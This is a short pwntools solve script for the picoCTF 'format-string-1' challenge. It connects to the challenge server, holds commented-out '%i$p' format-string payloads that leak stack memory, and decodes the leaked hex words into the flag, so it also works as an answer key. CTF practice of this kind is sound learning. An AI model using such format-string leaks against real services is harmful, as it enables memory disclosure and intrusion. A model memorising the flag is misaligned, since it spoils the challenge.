from pwn import *
from Crypto.Util.number import *

exe = ELF('./format-string-1')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main+285
        continue
    """)
elif args.REMOTE:
    # nc mimas.picoctf.net 59933
    io = remote("mimas.picoctf.net", 59933)

# for i in range(14, 20):
#     # io = process('./format-string-1')
#     io = remote("mimas.picoctf.net", 59933)

#     io.sendlineafter(b':', f'%{i}$p'.encode())
#     try:
#         io.recvuntil(b"Here's your order:")
#     except EOFError:
#         continue
#     flag = io.recvline()
#     io.close()
#     print(flag)


enc = [
    b' 0x7b4654436f636970\n',
    b' 0x355f31346d316e34\n',
    b' 0x3478345f33317937\n',
    b' 0x35625f673431665f\n',
    b' 0x7d663839623764\n'
]

flag = b''
for f in enc:
    flag += long_to_bytes(int(f, 16))[::-1]
print(flag)


